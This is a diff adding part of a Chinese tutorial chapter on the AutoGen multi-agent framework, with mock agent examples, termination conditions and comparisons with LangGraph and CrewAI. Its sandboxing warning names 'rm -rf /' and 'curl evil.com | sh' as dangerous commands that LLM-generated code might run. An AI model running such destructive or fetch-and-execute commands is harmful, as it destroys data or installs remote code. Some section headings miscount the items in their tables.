+<td>&quot;业务写对话剧本&quot;</td>
+</tr>
+</tbody></table>
+<p><strong>经验法则</strong>：</p>
+<ul>
+<li><strong>3-5 个固定角色、流程清晰</strong> → AutoGen GroupChat</li>
+<li><strong>多分支、长流程、需 checkpoint</strong> → LangGraph</li>
+<li><strong>想给业务/PM 看懂流程</strong> → AutoGen（代码即剧本）</li>
+<li><strong>想给工程师精确控制</strong> → LangGraph</li>
+</ul>
+<hr>
+<h2 id="sec-14-5-groupchatmanager-与-speaker-selection">14.5 GroupChatManager 与 speaker selection</h2>
+<h3 id="sec-14-5-1-groupchatmanager-自动选-speaker">14.5.1 GroupChatManager 自动选 speaker</h3>
+<p><strong><code>GroupChatManager</code></strong> 是 v0.4 中管理对话流的内部组件（一般不直接用）。在 <code>SelectorGroupChat</code> 中：</p>
+<ol>
+<li>把当前对话历史 + 所有 Agent 的 <code>description</code> 拼成 prompt</li>
+<li>调一次 LLM 决定下一个 speaker</li>
+<li>把选中的 Agent 加到消息队列，下一轮执行</li>
+</ol>
+<p><strong>示例</strong>：3 角色客服场景，Manager 选下一 speaker：</p>
+<pre><code class="language-python">
+from autogen_agentchat.teams import SelectorGroupChat
+from autogen_agentchat.conditions import MaxMessageTermination, TextMentionTermination
+
+# 3 角色客服
+classifier = AssistantAgent(
+    name=&quot;Classifier&quot;, model_client=model_client,
+    description=&quot;分类用户问题（账单/技术/退订）&quot;,
+    system_message=&quot;把用户问题分到对应类别。&quot;,
+)
+billing_agent = AssistantAgent(
+    name=&quot;BillingAgent&quot;, model_client=model_client,
+    description=&quot;处理账单和付款问题&quot;,
+    system_message=&quot;你是账单专家。&quot;,
+)
+tech_agent = AssistantAgent(
+    name=&quot;TechAgent&quot;, model_client=model_client,
+    description=&quot;处理技术支持问题&quot;,
+    system_message=&quot;你是技术专家。&quot;,
+)
+supervisor = AssistantAgent(
+    name=&quot;Supervisor&quot;, model_client=model_client,
+    description=&quot;监督对话，当所有问题都回答完说 DONE&quot;,
+    system_message=&quot;当用户问题全部回答完时回复 DONE。&quot;,
+)
+
+team = SelectorGroupChat(
+    participants=[classifier, billing_agent, tech_agent, supervisor],
+    termination_condition=TextMentionTermination(&quot;DONE&quot;),  # 见 14.5.2
+    max_turns=10,
+)
+</code></pre>
+<h3 id="sec-14-5-2-terminationcondition-4-种内置">14.5.2 TerminationCondition 4 种内置</h3>
+<table class="md-table"><thead><tr>
+<th>终止条件</th>
+<th>触发条件</th>
+<th>适用</th>
+</tr></thead><tbody>
+<tr>
+<td><code>TextMentionTermination(&quot;DONE&quot;)</code></td>
+<td>任意消息含 &quot;DONE&quot;</td>
+<td>显式收工信号</td>
+</tr>
+<tr>
+<td><code>FunctionCallTermination(func)</code></td>
+<td>调了指定函数</td>
+<td>&quot;工具调用完即终止&quot;</td>
+</tr>
+<tr>
+<td><code>TokenUsageTermination(max_tokens)</code></td>
+<td>累计 token ≥ 阈值</td>
+<td><strong>成本控制</strong>（生产必备）</td>
+</tr>
+<tr>
+<td><code>TimeoutTermination(seconds)</code></td>
+<td>超过 N 秒</td>
+<td>防止长对话卡住</td>
+</tr>
+<tr>
+<td><code>HandoffTermination(target)</code></td>
+<td>移交给 target Agent</td>
+<td>Swarm 范式</td>
+</tr>
+</tbody></table>
+<p><strong>可组合</strong>：<code>MaxMessageTermination(20) | TextMentionTermination(&quot;DONE&quot;)</code>——任一触发即终止。</p>
+<h3 id="sec-14-5-3-对照-ch13-终止机制">14.5.3 对照 ch13 终止机制</h3>
+<table class="md-table"><thead><tr>
+<th>ch13 LangGraph 终止</th>
+<th>ch14 AutoGen 终止</th>
+</tr></thead><tbody>
+<tr>
+<td><code>should_continue</code> 路由函数返回 END</td>
+<td><code>TerminationCondition</code> 对象</td>
+</tr>
+<tr>
+<td><strong><code>GraphRecursionError</code></strong>（无限循环）</td>
+<td><strong><code>MaxMessageTermination</code> 自动防呆</strong></td>
+</tr>
+<tr>
+<td><strong>手动 track_tokens</strong>（§13.6.3 实战）</td>
+<td><strong><code>TokenUsageTermination</code> 内置</strong></td>
+</tr>
+</tbody></table>
+<blockquote>
+<p><strong>AutoGen 在&quot;防呆&quot;上比 LangGraph 友好</strong>——LangGraph 需要手撸 <code>should_continue</code> 路由函数 + 手动 track tokens；AutoGen 一个 <code>TerminationCondition</code> 链搞定。</p>
+</blockquote>
+<h3 id="sec-14-5-4-selectorgroupchat-vs-roundrobingroupchat-选型决策">14.5.4 SelectorGroupChat vs RoundRobinGroupChat 选型决策</h3>
+<table class="md-table"><thead><tr>
+<th>场景</th>
+<th>推荐</th>
+<th>理由</th>
+</tr></thead><tbody>
+<tr>
+<td><strong>客服多分类路由</strong>（用户问题分到账单/技术/退订）</td>
+<td><code>SelectorGroupChat</code></td>
+<td>动态决策，避免&quot;用户问账单但轮到技术 Agent&quot;</td>
+</tr>
+<tr>
+<td><strong>辩论（正方/反方/裁判）</strong></td>
+<td><code>RoundRobinGroupChat</code></td>
+<td>角色固定，强制轮流</td>
+</tr>
+<tr>
+<td><strong>数据流水线</strong>（清洗 → 分析 → 报告）</td>
+<td><code>RoundRobinGroupChat</code></td>
+<td>步骤固定</td>
+</tr>
+<tr>
+<td><strong>创意头脑风暴</strong>（谁有新点子谁说）</td>
+<td><code>SelectorGroupChat</code></td>
+<td>选有想法的 Agent</td>
+</tr>
+<tr>
+<td><strong>代码审查 + 自动测试</strong></td>
+<td><code>SelectorGroupChat</code></td>
+<td>失败时让 &quot;tester&quot; 反复跑</td>
+</tr>
+<tr>
+<td><strong>超过 5 个 Agent 的大型协作</strong></td>
+<td><code>SelectorGroupChat</code></td>
+<td>轮转 5+ Agent 等待时间太长，动态选更优</td>
+</tr>
+</tbody></table>
+<p><strong>经验法则</strong>：<strong>先 <code>RoundRobinGroupChat</code>，跑通后再考虑 <code>SelectorGroupChat</code></strong>——后者每轮多 1 次 LLM 调用（成本 + 200-500ms 延迟），但更灵活。</p>
+<blockquote>
+<p><strong>本节是&quot;选哪种团队类&quot;</strong>（<code>RoundRobinGroupChat</code> / <code>SelectorGroupChat</code> / <code>Swarm</code> / <code>MagenticOneGroupChat</code>），<strong>与 §14.5.2 终止条件是不同维度</strong>——前者决定&quot;谁说&quot;，后者决定&quot;什么时候停&quot;。选完团队类后，再用 <code>MaxMessageTermination</code> 等终止条件兜底。</p>
+</blockquote>
+<hr>
+<h2 id="sec-14-6-完整-react-agent-实战-ch13-ch14-对照">14.6 完整 ReAct Agent 实战（ch13↔ch14 对照）</h2>
+<h3 id="sec-14-6-1-完整-react-agent-80-行">14.6.1 完整 ReAct Agent 80 行</h3>
+<p><strong>场景</strong>：让 Agent 回答&quot;北京今天需要带伞吗？&quot;，需要先查天气，再决定是否提醒。</p>
+<pre><code class="language-python">
+import asyncio
+from autogen_agentchat.agents import AssistantAgent
+from autogen_agentchat.teams import RoundRobinGroupChat
+from autogen_agentchat.conditions import MaxMessageTermination
+from autogen_core.models import CreateResult, ModelInfo
+
+
+# 工具定义（OpenAI / Anthropic 风格的 function calling schema）
+TOOL_GET_WEATHER = {
+    &quot;name&quot;: &quot;get_weather&quot;,
+    &quot;description&quot;: &quot;查询城市天气&quot;,
+    &quot;parameters&quot;: {
+        &quot;type&quot;: &quot;object&quot;,
+        &quot;properties&quot;: {&quot;city&quot;: {&quot;type&quot;: &quot;string&quot;, &quot;description&quot;: &quot;城市名&quot;}},
+        &quot;required&quot;: [&quot;city&quot;],
+    },
+}
+
+TOOL_SEND_REMINDER = {
+    &quot;name&quot;: &quot;send_reminder&quot;,
+    &quot;description&quot;: &quot;发送提醒到用户日历&quot;,
+    &quot;parameters&quot;: {
+        &quot;type&quot;: &quot;object&quot;,
+        &quot;properties&quot;: {&quot;content&quot;: {&quot;type&quot;: &quot;string&quot;, &quot;description&quot;: &quot;提醒内容&quot;}},
+        &quot;required&quot;: [&quot;content&quot;],
+    },
+}
+
+
+class ReactMockClient:
+    &quot;&quot;&quot;按调用次数返回 ReAct 3 步（mock 模式：Action + Observation 在同一条 text 里）&quot;&quot;&quot;
+    def __init__(self):
+        self._call = 0
+        self.model_info: ModelInfo = {
+            &quot;vision&quot;: False, &quot;function_calling&quot;: True, &quot;json_output&quot;: False,
+            &quot;family&quot;: &quot;mock&quot;, &quot;structured_output&quot;: False, &quot;multiple_system_messages&quot;: True,
+        }
+
+    async def create(self, messages, **kwargs) -&gt; CreateResult:
+        # ReAct 3 步：①查天气 ②发提醒 ③收工
+        # 注意：mock 模式下 Action 和 Observation 都由 mock 返回（真实场景 Observation
+        # 由工具执行器回填到 message history），按 call count 推进 state
+        if self._call == 0:
+            text = &quot;Thought: 需要查北京天气\nAction: get_weather(city=&#x27;北京&#x27;)\nObservation: 有雨&quot;
+        elif self._call == 1:
+            text = &quot;Thought: 下雨了，提醒用户\nAction: send_reminder(content=&#x27;带伞&#x27;)\nObservation: 已加入日历&quot;
+        else:
+            text = &quot;Final Answer: 已提醒您带伞。&quot;
+        self._call += 1
+        return CreateResult(
+            content=text, finish_reason=&quot;stop&quot;,
+            usage={&quot;prompt_tokens&quot;: 20, &quot;completion_tokens&quot;: len(text)}, cached=False,
+        )
+    async def close(self): pass
+
+
+async def react_agent():
+    # 单 Agent + 2 工具（简化版：tool 由 mock client 自己&quot;调&quot;）
+    agent = AssistantAgent(
+        name=&quot;react_agent&quot;,
+        model_client=ReactMockClient(),
+        system_message=(
+            &quot;你是 ReAct Agent：用 Thought/Action/Observation 循环，&quot;
+            &quot;先 get_weather 看北京天气，再 send_reminder 提醒用户，最后 Final Answer。&quot;
+        ),
+        tools=[],  # mock 模式不真注册 tools；真实场景：tools=[get_weather, send_reminder]
+    )
+
+    team = RoundRobinGroupChat(
+        participants=[agent],
+        termination_condition=MaxMessageTermination(max_messages=5),
+    )
+
+    result = await team.run(task=&quot;北京今天需要带伞吗？&quot;)
+    print(f&quot;\n=== 共 {len(result.messages)} 条消息 ===\n&quot;)
+    for i, m in enumerate(result.messages):
+        print(f&quot;[{i}] [{m.source}] {m.content[:100]}&quot;)
+
+
+asyncio.run(react_agent())
+</code></pre>
+<p><strong>实际跑通</strong>（venv 内）——输出类似：</p>
+<pre><code class="language-python">
+=== 共 4 条消息 ===
+[0] [user] 北京今天需要带伞吗？
+[1] [react_agent] Thought: 需要查北京天气\nAction: get_weather(city=&#x27;北京&#x27;)
+[2] [react_agent] Action: send_reminder(content=&#x27;带伞&#x27;)...
+[3] [react_agent] Final Answer: 已提醒您带伞。
+</code></pre>
+<h3 id="sec-14-6-2-ch13-ch14-react-对照表-5-维度">14.6.2 ch13↔ch14 ReAct 对照表（5 维度）</h3>
+<table class="md-table"><thead><tr>
+<th>维度</th>
+<th>ch13 LangGraph ReAct</th>
+<th><strong>ch14 AutoGen ReAct</strong></th>
+</tr></thead><tbody>
+<tr>
+<td><strong>工具注册</strong></td>
+<td><code>bind_tools([get_weather])</code>（手撸）</td>
+<td><code>tools=[get_weather]</code>（参数化）</td>
+</tr>
+<tr>
+<td><strong>状态载体</strong></td>
+<td><code>State(messages=[])</code> + Reducer</td>
+<td><code>GroupChat.messages</code>（内置）</td>
+</tr>
+<tr>
+<td><strong>终止条件</strong></td>
+<td><code>should_continue</code> 路由函数</td>
+<td><code>MaxMessageTermination</code>（防呆）</td>
+</tr>
+<tr>
+<td><strong>检查点</strong></td>
+<td><code>MemorySaver</code> / <code>SqliteSaver</code></td>
+<td><code>TerminationCondition</code> 重启（v0.4 计划中）</td>
+</tr>
+</tbody></table>
+<p><strong>核心差异</strong>：AutoGen 把&quot;状态管理&quot;和&quot;终止判断&quot;都内置了——你只需要配置 Agent 做什么，框架自己管&quot;什么时候停&quot;。</p>
+<h3 id="sec-14-6-3-autogen-原生-tools-function-calling">14.6.3 AutoGen 原生 <code>tools</code> + Function Calling</h3>
+<p><strong>真实场景</strong>（需 OpenAI / Anthropic API key）：</p>
+<pre><code class="language-python">
+from autogen_ext.models.openai import OpenAIChatCompletionClient
+from autogen_core.tools import FunctionTool
+
+# 1. 把 Python 函数包装成 tool
+def get_weather(city: str) -&gt; str:
+    &quot;&quot;&quot;查询城市天气（mock）&quot;&quot;&quot;
+    return f&quot;{city}天气：25 度，有雨&quot;
+
+def send_reminder(content: str) -&gt; str:
+    &quot;&quot;&quot;发送提醒（mock）&quot;&quot;&quot;
+    return f&quot;已加入日历：{content}&quot;
+
+# 2. 创建 model client
+model_client = OpenAIChatCompletionClient(model=&quot;gpt-4o&quot;)
+
+# 3. 创建 Agent（v0.4 推荐写法）
+agent = AssistantAgent(
+    name=&quot;weather_assistant&quot;,
+    model_client=model_client,
+    system_message=&quot;你是天气助手，查天气后决定是否提醒用户。&quot;,
+    tools=[get_weather, send_reminder],   # ← 自动转 function calling schema
+)
+
+team = RoundRobinGroupChat(
+    participants=[agent],
+    termination_condition=MaxMessageTermination(max_messages=8),
+)
+
+result = await team.run(task=&quot;北京今天需要带伞吗？&quot;)
+# 真实 GPT-4 会自动循环：调 get_weather → 拿到 &quot;有雨&quot; → 调 send_reminder → Final Answer
+</code></pre>
+<p><strong>关键点</strong>：v0.4 把 Python 函数直接传给 <code>tools=[]</code>，框架自动转成 OpenAI / Anthropic 的 function calling schema——<strong>比 LangGraph 手撸 <code>bind_tools</code> 省一半代码</strong>。</p>
+<h3 id="sec-14-6-4-autogen-v0-4-跨语言-net-python-实战">14.6.4 AutoGen v0.4 跨语言（.NET / Python）实战</h3>
+<p><strong>独有特性</strong>（LangGraph 没有）：v0.4 Actor Model 支持 <strong>Python Agent ↔ .NET Agent 互相发消息</strong>。</p>
+<pre><code class="language-python">
+# Python 端
+from autogen_agentchat.agents import AssistantAgent
+
+python_agent = AssistantAgent(
+    name=&quot;python_analyst&quot;,
+    model_client=model_client,
+    system_message=&quot;你是 Python 数据分析师，跑 pandas/numpy。&quot;,
+)
+
+# .NET 端（C# 代码 — 通过 protobuf 协议通信）
+# 部署在另一台机器，订阅 &quot;python_analyst&quot; 消息
+# dotnet_agent.OnMessage(msg =&gt; /* 调 C# WPF GUI */);
+</code></pre>
+<p><strong>适用场景</strong>：</p>
+<ul>
+<li><strong>企业内部</strong>：Python 数据团队 + .NET 业务系统 互调</li>
+<li><strong>边缘部署</strong>：Python Agent 在云端，.NET Agent 在本地 PC 控制硬件</li>
+</ul>
+<p><strong>现实约束</strong>：跨语言需要 protobuf + autogen-core runtime 部署，对小项目是过度工程。<strong>90% 场景 Python 内部用就够</strong>。</p>
+<hr>
+<h2 id="sec-14-7-完整-supervisor-实战-ch13-ch14-对照">14.7 完整 Supervisor 实战（ch13↔ch14 对照）</h2>
+<h3 id="sec-14-7-1-完整-supervisor-80-行">14.7.1 完整 Supervisor 80 行</h3>
+<p><strong>场景</strong>：Supervisor 委派任务给 3 个 Worker（Researcher / Writer / Editor），Worker 完成后回报 Supervisor，Supervisor 决定终止。</p>
+<pre><code class="language-python">
+import asyncio
+from autogen_agentchat.agents import AssistantAgent
+from autogen_agentchat.teams import RoundRobinGroupChat
+from autogen_agentchat.conditions import MaxMessageTermination, TextMentionTermination
+from autogen_core.models import CreateResult, ModelInfo
+
+
+def make_mock_client(text: str):
+    &quot;&quot;&quot;工厂函数：每个 Agent 自己的 model_client（共享会乱套）&quot;&quot;&quot;
+    class _MockClient:
+        def __init__(self):
+            self.model_info: ModelInfo = {
+                &quot;vision&quot;: False, &quot;function_calling&quot;: False, &quot;json_output&quot;: False,
+                &quot;family&quot;: &quot;mock&quot;, &quot;structured_output&quot;: False, &quot;multiple_system_messages&quot;: True,
+            }
+        async def create(self, messages, **kwargs) -&gt; CreateResult:
+            return CreateResult(
+                content=text, finish_reason=&quot;stop&quot;,
+                usage={&quot;prompt_tokens&quot;: 15, &quot;completion_tokens&quot;: len(text)}, cached=False,
+            )
+        async def close(self): pass
+    return _MockClient()
+
+
+async def supervisor_team():
+    supervisor = AssistantAgent(
+        name=&quot;Supervisor&quot;,
+        model_client=make_mock_client(&quot;请 Researcher 调研西湖历史。&quot;),
+        system_message=&quot;你是 Supervisor：把任务委派给 Worker，全部完成时说 DONE。&quot;,
+    )
+    researcher = AssistantAgent(
+        name=&quot;Researcher&quot;,
+        model_client=make_mock_client(&quot;西湖原为海湾，唐宋白居易、苏轼都留下足迹。&quot;),
+        system_message=&quot;你是研究员。&quot;,
+    )
+    writer = AssistantAgent(
+        name=&quot;Writer&quot;,
+        model_client=make_mock_client(&quot;西湖承载唐宋文脉，诗情画意。&quot;),
+        system_message=&quot;你是作家。&quot;,
+    )
+    editor = AssistantAgent(
+        name=&quot;Editor&quot;,
+        model_client=make_mock_client(&quot;DONE&quot;),
+        system_message=&quot;你是编辑，审稿后说 DONE。&quot;,
+    )
+
+    team = RoundRobinGroupChat(
+        participants=[supervisor, researcher, writer, editor],
+        # 委派顺序：supervisor → researcher → supervisor → writer → ... 简化版用 RoundRobin
+        termination_condition=MaxMessageTermination(max_messages=8) | TextMentionTermination(&quot;DONE&quot;),
+    )
+
+    result = await team.run(task=&quot;写一篇 100 字的西湖历史短文（3 步：调研-写作-审稿）&quot;)
+    print(f&quot;\n=== 共 {len(result.messages)} 条消息 ===\n&quot;)
+    for i, m in enumerate(result.messages):
+        print(f&quot;[{i}] [{m.source}] {m.content[:80]}&quot;)
+
+
+asyncio.run(supervisor_team())
+</code></pre>
+<h3 id="sec-14-7-2-ch13-ch14-supervisor-对照表-5-维度">14.7.2 ch13↔ch14 Supervisor 对照表（5 维度）</h3>
+<table class="md-table"><thead><tr>
+<th>维度</th>
+<th>ch13 LangGraph Supervisor</th>
+<th><strong>ch14 AutoGen Supervisor</strong></th>
+</tr></thead><tbody>
+<tr>
+<td><strong>Worker 实现</strong></td>
+<td>多个 <code>add_node(&quot;worker_X&quot;, worker_X_fn)</code></td>
+<td>多个 <code>AssistantAgent(name=&quot;X&quot;, ...)</code></td>
+</tr>
+<tr>
+<td><strong>委派逻辑</strong></td>
+<td>路由函数 <code>supervisor_fn(state) -&gt; &quot;next_worker&quot;</code></td>
+<td>LLM 选 speaker（<code>SelectorGroupChat</code>）</td>
+</tr>
+<tr>
+<td><strong>共享状态</strong></td>
+<td><code>State.worker_results: list</code> + Reducer</td>
+<td><code>GroupChat.messages</code>（所有消息共享）</td>
+</tr>
+<tr>
+<td><strong>终止条件</strong></td>
+<td><code>if all_done(state): return END</code></td>
+<td><code>TextMentionTermination(&quot;DONE&quot;)</code></td>
+</tr>
+</tbody></table>
+<p><strong>核心差异</strong>：AutoGen 把 Supervisor 也当成&quot;一个普通 Agent&quot;——它也会被 LLM 驱动、也会发消息、也会调工具。<strong>没有&quot;特殊节点&quot;概念</strong>。LangGraph 的 Supervisor 是&quot;图中的一个特殊节点&quot;——更显式但更受限。</p>
+<h3 id="sec-14-7-3-autogen-groupchat-的-supervisor-模拟-speaker-selection-定制">14.7.3 AutoGen GroupChat 的 Supervisor 模拟（speaker selection 定制）</h3>
+<p><strong>真实生产场景</strong>用 <code>SelectorGroupChat</code> + 显式 supervisor Agent：</p>
+<pre><code class="language-python">
+from autogen_agentchat.teams import SelectorGroupChat
+
+# 4 角色：Supervisor 委派给 3 个 Worker
+supervisor = AssistantAgent(
+    name=&quot;Supervisor&quot;,
+    model_client=model_client,
+    description=&quot;监督对话，把任务委派给 Researcher/Writer/Editor，全部完成时说 DONE&quot;,
+    system_message=&quot;按顺序：Researcher → Writer → Editor → DONE&quot;,
+)
+researcher = AssistantAgent(
+    name=&quot;Researcher&quot;, model_client=model_client,
+    description=&quot;提供历史事实&quot;, system_message=&quot;提供准确事实。&quot;,
+)
+writer = AssistantAgent(
+    name=&quot;Writer&quot;, model_client=model_client,
+    description=&quot;写文章&quot;, system_message=&quot;把事实写成 100 字短文。&quot;,
+)
+editor = AssistantAgent(
+    name=&quot;Editor&quot;, model_client=model_client,
+    description=&quot;审稿&quot;, system_message=&quot;审稿并改错。&quot;,
+)
+
+team = SelectorGroupChat(
+    participants=[supervisor, researcher, writer, editor],
+    termination_condition=TextMentionTermination(&quot;DONE&quot;) | MaxMessageTermination(15),
+    max_turns=15,
+)
+# LLM 自动选 speaker：Supervisor 决定下一步让谁说
+</code></pre>
+<h3 id="sec-14-7-4-autogen-vs-crewai-概念预演-桥接-ch15">14.7.4 AutoGen vs CrewAI 概念预演（桥接 ch15）</h3>
+<p><strong>预告 ch15</strong>：AutoGen 的&quot;Supervisor 委派&quot;和 ch15 CrewAI 的&quot;Hierarchical Process&quot;很相似——都是&quot;中心化 + 委派&quot;，但：</p>
+<table class="md-table"><thead><tr>
+<th>维度</th>
+<th>AutoGen</th>
+<th><strong>CrewAI</strong>（ch15 详讲）</th>
+</tr></thead><tbody>
+<tr>
+<td><strong>委派方式</strong></td>
+<td>LLM 选 speaker</td>
+<td><strong><code>Process.hierarchical</code> 自动经理 Agent</strong></td>
+</tr>
+<tr>
+<td><strong>Task 定义</strong></td>
+<td>散落在 Agent system_message</td>
+<td><strong>显式 <code>Task(description=..., agent=...)</code></strong></td>
+</tr>
+<tr>
+<td><strong>代码风格</strong></td>
+<td>配置 Agent + 团队</td>
+<td><strong>显式 Task 链（更像工作流）</strong></td>
+</tr>
+<tr>
+<td><strong>可读性</strong></td>
+<td>偏代码</td>
+<td><strong>偏业务剧本</strong>（PM 能直接读懂）</td>
+</tr>
+</tbody></table>
+<p><strong>经验</strong>：AutoGen 适合&quot;灵活对话&quot;，CrewAI 适合&quot;显式工作流 + 业务可读&quot;。</p>
+<hr>
+<h2 id="sec-14-8-高级特性-人机协作-代码执行-rag-agent">14.8 高级特性：人机协作 / 代码执行 / RAG Agent</h2>
+<h3 id="sec-14-8-1-人机协作-userproxyagent-作为一公民">14.8.1 人机协作（UserProxyAgent 作为一公民）</h3>
+<p><strong>v0.4 推荐</strong>：<code>UserProxyAgent(input_mode=&quot;console&quot;)</code> 让人类作为对话一员：</p>
+<pre><code class="language-python">
+from autogen_agentchat.agents import UserProxyAgent, AssistantAgent
+from autogen_agentchat.teams import RoundRobinGroupChat
+from autogen_agentchat.conditions import MaxMessageTermination
+
+assistant = AssistantAgent(
+    name=&quot;assistant&quot;, model_client=model_client,
+    system_message=&quot;你是助手，等用户提问后回答。&quot;,
+)
+human = UserProxyAgent(name=&quot;human&quot;, input_mode=&quot;console&quot;)  # ← 关键
+
+team = RoundRobinGroupChat(
+    participants=[assistant, human],
+    termination_condition=MaxMessageTermination(max_messages=4),
+)
+
+# 运行时：助手先说&quot;请问您想问什么？&quot; → 等待人输入 → 人回答 → 助手回复
+result = await team.run(task=&quot;开始&quot;)
+</code></pre>
+<p><strong>适用</strong>：客服对话、调试对话、收集用户反馈。</p>
+<h3 id="sec-14-8-2-代码执行-v0-4-独立-codeexecutoragent">14.8.2 代码执行（v0.4 独立 <code>CodeExecutorAgent</code>）</h3>
+<p>v0.4 把代码执行从 <code>UserProxyAgent</code> 拆出，独立 <code>CodeExecutorAgent</code>：</p>
+<pre><code class="language-python">
+from autogen_agentchat.agents import AssistantAgent, CodeExecutorAgent
+from autogen_ext.code_executors.local import LocalCommandLineCodeExecutor
+
+# 代码执行器（生产推荐 Docker，避免 LLM 跑 rm -rf /）
+executor = CodeExecutorAgent(
+    name=&quot;executor&quot;,
+    code_executor=LocalCommandLineCodeExecutor(timeout=10),  # 或 DockerCommandLineCodeExecutor
+)
+coder = AssistantAgent(
+    name=&quot;coder&quot;, model_client=model_client,
+    system_message=&quot;你是 Python 程序员，写代码解决问题。&quot;,
+    tools=[],  # 工具由 executor 接管
+)
+
+# Coder 写代码 → Executor 跑代码 → 结果回给 Coder
+</code></pre>
+<p><strong>安全警告</strong>：<strong>生产必须用 Docker executor</strong>——LLM 生成的代码可能 <code>rm -rf /</code> 或 <code>curl evil.com | sh</code>。<code>LocalCommandLineCodeExecutor</code> 仅用于受信任环境。</p>
+<h3 id="sec-14-8-3-rag-agent-内置">14.8.3 RAG Agent 内置</h3>
+<p>AutoGen 没官方 RAG Agent，但社区常用模式：把 RAG 检索包成 tool：</p>
+<pre><code class="language-python">
+def search_docs(query: str) -&gt; str:
+    &quot;&quot;&quot;检索公司文档（mock — 实际接向量库）&quot;&quot;&quot;
+    return f&quot;找到 3 篇关于&#x27;{query}&#x27;的文档：[doc1, doc2, doc3]&quot;
+
+rag_agent = AssistantAgent(
+    name=&quot;rag_assistant&quot;, model_client=model_client,
+    system_message=&quot;你是 RAG 助手：先 search_docs 找资料，再回答。&quot;,
+    tools=[search_docs],
+)
+# LLM 循环：search_docs → 拿到 doc1/2/3 → Final Answer
+</code></pre>
+<p><strong>对比 ch09 RAG</strong>：ch09 教 RAG 原理（chunk / embed / retrieve / augment / generate），ch14 教 RAG Agent 怎么落地（包成 tool 给 LLM 调）。</p>
+<h3 id="sec-14-8-4-4-高级特性速查">14.8.4 4 高级特性速查</h3>
+<table class="md-table"><thead><tr>
+<th>特性</th>
+<th>v0.4 类</th>
+<th>代码量</th>
+<th>适用</th>
+</tr></thead><tbody>
+<tr>
+<td><strong>代码执行</strong></td>
+<td><code>CodeExecutorAgent</code> + Docker/Local</td>
+<td>10 行</td>
+<td>数据分析、自动化</td>
+</tr>
+<tr>
+<td><strong>RAG Agent</strong></td>
+<td><code>AssistantAgent(tools=[search_docs])</code></td>
+<td>5 行</td>
+<td>知识库问答</td>
+</tr>
+<tr>
+<td><strong>Memory / RAG 检索历史</strong></td>
+<td>第三方集成（如 mem0）</td>
+<td>20 行</td>
+<td>长对话记忆</td>
+</tr>
+</tbody></table>
+<h3 id="sec-14-8-5-5-大实战技巧-生产踩坑总结">14.8.5 5 大实战技巧（生产踩坑总结）</h3>
+<ol>
+<li><strong>每个 Agent 一个 model_client 实例</strong>——共享会导致所有 Agent 返回相同 response</li>
+<li><strong><code>description</code> 比 <code>system_message</code> 更重要</strong>（SelectorGroupChat 选 speaker 全看它）——保持 20-50 字</li>
+<li><strong>真 LLM 跑不通时先 mock 验证</strong>——把 OpenAI 客户端换成 MockChatClient 排除 API 问题</li>
+<li><strong>用 <code>asyncio.run()</code> 包裹 <code>team.run()</code></strong>——AutoGen 是 async 框架，忘了 <code>await</code> 不会报错（返回 coroutine）</li>
+<li><strong>生产加 <code>tracing=True</code></strong>（在 Agent 创建时）—— 消息会通过 OpenTelemetry 导出，调试省一半时间</li>
+</ol>
+<h3 id="sec-14-8-6-autogen-与-ch04-7-框架的对应">14.8.6 AutoGen 与 ch04 7 框架的对应</h3>
+<p>ch04 列了 7 个 Agent 框架，AutoGen 在其中的定位：</p>
+<table class="md-table"><thead><tr>
+<th>框架</th>
+<th>哲学</th>
+<th>与 AutoGen 关系</th>
+</tr></thead><tbody>
+<tr>
+<td><strong>LangGraph</strong></td>
+<td>图（StateGraph）</td>
+<td>AutoGen 是&quot;对话版 LangGraph&quot;（更短代码）</td>
+</tr>
+<tr>
+<td><strong>AutoGen</strong></td>
+<td>对话（GroupChat）</td>
+<td>本章</td>
+</tr>
+<tr>
+<td><strong>CrewAI</strong></td>
+<td>任务（Task 链）</td>
+<td>AutoGen vs CrewAI 详见 ch15</td>
+</tr>
+<tr>
+<td><strong>LlamaIndex</strong></td>
+<td>索引（RAG 优先）</td>
+<td>互不冲突，AutoGen + LlamaIndex = RAG Agent</td>
+</tr>
+<tr>
+<td><strong>Agno</strong></td>
+<td>全栈（数据 + Agent）</td>
+<td>AutoGen 是 Agno 的核心编排层之一</td>
+</tr>
+<tr>
+<td><strong>OpenAI Agents SDK</strong></td>
+<td>标准（OpenAI 一公民）</td>
+<td>AutoGen 跨厂商，OpenAI SDK 强 OpenAI 绑定</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="sec-14-9-错误处理与终止-ch14-vs-ch13-终止机制对照">14.9 错误处理与终止（ch14 vs ch13 终止机制对照）</h2>
+<h3 id="sec-14-9-1-5-大错误类型">14.9.1 5 大错误类型</h3>
+<table class="md-table"><thead><tr>
+<th>错误</th>
+<th>触发条件</th>
+<th>严重度</th>
+<th>修复</th>
+</tr></thead><tbody>
+<tr>
+<td><strong>Max Turn Exceeded</strong></td>
+<td>LLM 调用次数 &gt; max_turns</td>
+<td>中</td>
+<td>提高 max_turns / 简化任务</td>
+</tr>
+<tr>
+<td><strong>Function Call Failed</strong></td>
+<td>工具调用异常（参数错误 / 网络）</td>
+<td>高</td>
+<td>工具内 try-except + 返回错误信息</td>
+</tr>
+<tr>
+<td><strong>Speaker Loop</strong></td>
+<td>A → B → A → B 无限循环</td>
+<td>中</td>
+<td>用 <code>SelectorGroupChat</code> + 强制 max_turns</td>
+</tr>
+<tr>
+<td><strong>Context Overflow</strong></td>
+<td>messages 累积超过 LLM context</td>
+<td><strong>高</strong></td>
+<td>加 <code>TokenUsageTermination</code> + 滑动窗口</td>
+</tr>
+</tbody></table>
+<h3 id="sec-14-9-2-5-大错误修复示例">14.9.2 5 大错误修复示例</h3>
+<pre><code class="language-python">
+# 1. Termination Not Met → 加 MaxMessageTermination 兜底
+team = RoundRobinGroupChat(
+    participants=[...],
+    termination_condition=(
+        TextMentionTermination(&quot;DONE&quot;) |        # 主终止：显式 DONE
+        MaxMessageTermination(max_messages=20)   # 兜底：20 条强制停
+    ),
+)
+
+# 2. Max Turn Exceeded → 提高 max_turns
+team = SelectorGroupChat(
+    participants=[...],
+    max_turns=30,  # 默认 12，改大
+)
+
+# 3. Function Call Failed → 工具内 try-except
+def get_weather(city: str) -&gt; str:
+    try:
+        return real_api_call(city)
+    except Exception as e:
+        return f&quot;天气服务异常：{e}（请重试或换城市）&quot;  # 错误信息回给 LLM，LLM 决定下一步
+
+# 4. Speaker Loop → SelectorGroupChat + max_turns
+team = SelectorGroupChat(
+    participants=[A, B, C],
+    termination_condition=MaxMessageTermination(max_messages=15),  # 强制 cap
+)
+
+# 5. Context Overflow → TokenUsageTermination + 滑动窗口
